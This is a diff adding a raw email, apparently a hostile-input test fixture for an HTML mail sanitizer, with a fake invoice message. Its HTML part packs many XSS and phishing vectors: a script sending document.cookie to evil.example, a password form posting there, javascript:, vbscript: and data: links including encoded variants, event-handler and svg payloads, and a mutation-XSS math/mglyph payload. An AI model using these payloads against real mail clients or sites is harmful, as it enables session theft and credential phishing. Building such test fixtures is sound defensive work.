@@ -1,0 +1,43 @@
+Received: from mail.example (mail.example [192.0.2.10]) by mx.acmemsp.example; Tue, 17 Nov 2026 10:15:00 +0700
+Authentication-Results: mx.acmemsp.example;
+ spf=pass smtp.mailfrom=unknown.example;
+ dkim=pass header.d=unknown.example header.s=sel1;
+ dmarc=pass header.from=unknown.example
+From: Unknown Sender <someone@unknown.example>
+To: Acme MSP Support <support@acmemsp.example>
+Subject: Invoice attached
+Date: Tue, 17 Nov 2026 10:15:00 +0700
+Message-ID: <0023-hostile@unknown.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt-b1"
+
+--alt-b1
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+Please see the invoice.
+--alt-b1
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/"><style>body{background:url(https://evil.example/bg.png)}</style><script>alert('head')</script></head>
+<body onload="steal()"><p style="background-image:url('https://evil.example/css.png')">Please see the invoice.</p>
+<script>document.location='https://evil.example/?c='+document.cookie</script>
+<img src="x" onerror="alert(1)">
+<img src="https://evil.example/pixel.gif" alt="logo">
+<img src="//evil.example/pr.gif">
+<img src="data:image/png;base64,iVBORw0KGgo=" alt="embedded">
+<a href="javascript:alert(2)">Click here</a>
+<a href="JaVaScRiPt&#58;alert(3)">Encoded</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg0KTwvc2NyaXB0Pg==">Data link</a>
+<a href="vbscript:msgbox(5)">VB</a>
+<a href="https://acmemsp.example/help" onclick="alert(6)" target="_blank">Help</a>
+<a href="cid:image001">Cid link</a>
+<svg onload="alert(7)"><script>alert(8)</script><a xlink:href="javascript:alert(9)">svg link</a></svg>
+<iframe src="https://evil.example/frame"></iframe>
+<form action="https://evil.example/login"><input name="password" type="password"></form>
+<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y.swf">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(10)></style></mglyph></table></mtext></math>
+<div id="x" class="y">Thanks</div>
+</body></html>
+--alt-b1--
